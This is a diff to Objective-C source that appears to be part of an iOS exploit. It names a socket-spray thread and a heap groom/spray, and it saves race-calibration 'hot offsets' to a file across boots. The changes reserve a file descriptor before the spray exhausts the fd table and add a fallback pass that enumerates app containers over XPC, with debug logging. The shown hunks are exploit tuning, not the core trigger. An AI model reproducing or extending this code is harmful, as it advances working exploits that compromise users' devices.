@@ -135,6 +135,10 @@ static void *rc_socket_spray_thread(void *arg) {
 @implementation LightSwordCalib
 
 static int g_rc_log_fd = -1;
+static int g_hotPersistFd = -1;   /* reserved BEFORE the groom/spray eats the
+                                     fd table (the 17-debugger errno=24 receipt
+                                     law: a late open EMFILEs and the boot's
+                                     hot offsets are lost) */
 
 static NSMutableString *g_rc_log_str = nil;
 
@@ -226,7 +230,7 @@ static uint32_t rc_hotsync_warm(uint64_t *warm, uint32_t warmNin) {
     qFlags(q, 0x100000000ULL);
     __block uint32_t merged = 0;
     __block int cands = 0;
-    qIterate(q, ^void(void *obj) {
+    void (^fill)(void *) = ^void(void *obj) {
         char path[1024]; path[0] = 0;
         oPath(obj, path, sizeof path);
         if (!path[0]) return;
@@ -256,8 +260,29 @@ static uint32_t rc_hotsync_warm(uint64_t *warm, uint32_t warmNin) {
             break;                      /* one name per container is enough */
         }
         return;
-    });
-    qFree(q);
+    };
+
+    qIterate(q, fill);
+    rc_log("[hotsync] pass1 class=15 flags=0x100000000 containers=%d merged=%u",
+           cands, merged);
+    if (cands == 0) {
+        /* pass2: same class, no operation flags — the 17-debugger receipt
+           showed pass1 empty; a bare metadata query either enumerates or
+           proves the XPC wall, and the log line names which */
+        qFree(q);
+        void *q2 = qCreate();
+        if (q2) {
+            qClass(q2, 15);
+            qFlags(q2, 0);
+            qIterate(q2, fill);
+            rc_log("[hotsync] pass2 flags=0 containers=%d merged=%u", cands, merged);
+            qFree(q2);
+        }
+        if (cands == 0)
+            rc_log("[hotsync] MCM enumerated ZERO containers — XPC denied or no visible app-managed set");
+    } else {
+        qFree(q);
+    }
     rc_log("[hotsync] containers=%d merged=%u total-warm=%u", cands, merged, warmN);
     return warmN;
 }
@@ -319,6 +344,12 @@ static CFNumberRef RCNUM(int64_t v) {
         NSString *wp2 = [docs stringByAppendingPathComponent:@"lightsword_wrong.txt"];
         snprintf(hotfile, sizeof hotfile, "%s", [hp2 fileSystemRepresentation]);
         snprintf(wrongfile, sizeof wrongfile, "%s", [wp2 fileSystemRepresentation]);
+        /* the reserve: open the persist fd NOW, before the groom/spray
+           fills the table (17-debugger receipt: persist after runs
+           EMFILEd, errno=24, and the boot's PARTIALs were lost) */
+        g_hotPersistFd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
+        rc_log("[hotsync] persist fd reserved fd=%d (%s)",
+               g_hotPersistFd, g_hotPersistFd >= 0 ? hotfile : "FAILED");
         NSString *hpl = [docs stringByAppendingPathComponent:@"racecalib_hot.txt"];
         NSString *readFrom = [NSFileManager.defaultManager fileExistsAtPath:hp2] ? hp2 : hpl;
         NSString *srcName = [NSFileManager.defaultManager fileExistsAtPath:hp2] ? @"lightsword_hot.txt"
@@ -610,7 +641,8 @@ static CFNumberRef RCNUM(int64_t v) {
 
     /* v10: persist this boot's hot offsets for future boots (dedup vs warm) */
     if (rc_hotN) {
-        int hfd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
+        int hfd = g_hotPersistFd;
+        if (hfd < 0) hfd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
         if (hfd >= 0) {
             rc_log("[hotsync] local hot persist OK (%s)", hotfile);
             char l2[40];
